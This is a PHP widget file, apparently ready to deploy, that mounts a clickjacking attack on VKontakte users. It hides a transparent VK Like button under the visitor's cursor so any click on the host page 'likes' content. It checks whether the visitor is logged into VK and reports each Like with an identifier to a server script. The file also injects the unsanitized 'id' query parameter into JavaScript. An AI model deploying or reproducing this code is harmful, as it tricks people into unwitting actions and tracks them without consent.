<?php

$mysite = 'http://avaelkross.ru';  //сюда пишем адрес сайта на котором будет установлен виджет. начиная с http:// - все как положено





$myid = $_GET['id'];
$myguid = rand(1,99999999);
?><html><head>
<style>* {margin:0;padding:0;cursor:pointer;} iframe {border: 0 !important;} #sfwgt{border: 0 !important;}
#myoverlay {
			width: 100%;
			height: 100%;
			position: absolute;
			top: 0;
			left: 0;
			cursor: pointer;
			z-index: 100;
		}
#mywrap1 {
			overflow: hidden;
			width: 105px;
			height: 25px;
			opacity: 0;
			position: absolute;
			z-index: 101;
		
		}
#mywrap2 {
margin-left: 0px;
margin-top: 0px;
		}
#mynovis {
opacity: 0.0;
}
</style>
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script type="text/javascript" src="//vk.com/js/api/openapi.js?115"></script>
<script type="text/javascript">

function unframe() {
  setTimeout('top.postMessage("patched", "<?=$mysite?>")', 1);
}

</script>

</head>
<?php
$myhost = $_GET[host];

?>
<body id="mywtgbody" onclick="unframe()" style="cursor: pointer;">
<div id="mynovis">
<div id="myvklogin">
	
</div>
</div>
<div id="myoverlay">
		<div id="mywrap1">
			<div id="mywrap2">
				<div id="vk_groups"></div>
			</div>
		</div>
</div>



<script>

VK.init({apiId: <?=$myid?>});
VK.Widgets.Auth("myvklogin", {width: "200px", authUrl: '/dev/index.php'});


VK.Widgets.Like("vk_groups", {type: "button", page_id: <?=$myguid?>, pageUrl: "<?=$mysite.'?mypp='.$myguid?>"});


VK.Observer.subscribe("widgets.like.liked", function f() 
{
	clearInterval(intervalID);
	setTimeout('top.postMessage("myhide1", "<?=$mysite?>")', 1);
	$.ajax({
		url: '/witget/join1.php',
		type: 'POST',
		dataType: 'html',
		data: {guid: <?=$myguid?>, id: <?=$myid?>},
	});
	
});
VK.Observer.subscribe("widgets.like.unliked", function f() 
{
	clearInterval(intervalID);
	setTimeout('top.postMessage("myhide2", "<?=$mysite?>")', 1);

});
var el = $('#mywrap1');
$(window).on('mousemove', function(e) {
	el.css({left:  e.pageX - 50, top:   e.pageY - 12 });
});
var intervalID = setInterval(mygeth,500);

function mygeth() {
	var hh = $('#myvklogin').height();
	if (hh == 93) {
		setTimeout('top.postMessage("myshow", "<?=$mysite?>")', 1);
	} else {
		setTimeout('top.postMessage("myhide", "<?=$mysite?>")', 1);
	}
}
</script>
</body>
